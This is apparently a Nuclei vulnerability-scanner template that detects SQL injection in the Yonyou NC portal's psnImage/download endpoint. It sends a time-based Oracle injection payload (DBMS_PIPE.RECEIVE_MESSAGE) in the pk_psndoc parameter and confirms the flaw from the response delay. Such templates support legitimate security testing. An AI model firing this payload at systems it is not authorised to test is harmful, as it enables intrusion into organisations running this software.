id: yonyou-nc-psnImage-download-sqli
info:
  name: 用友 NC psnImage/download - sqli
  author: leadlife
  severity: high
  description: 
  reference: 
    - demo
  classification:
    cve-id: 
  metadata:
    verified: true
    fofa-query: demo
  tags: 2024,sqli,yonyou,nc,time,oa

http:
  - raw:  
      - |
        @timeout: 15s
        GET /portal/pt/psnImage/download?pageId=login&pk_psndoc=1%27)%20AND%206322=DBMS_PIPE.RECEIVE_MESSAGE(CHR(65)||CHR(79)||CHR(66)||CHR(101),6)%20AND%20(%27rASZ%27=%27rASZ HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: dsl
        dsl:
          - contains_all(body,'PNG')
          - status_code == 200
          - duration >= 5 && duration < 9
        condition: and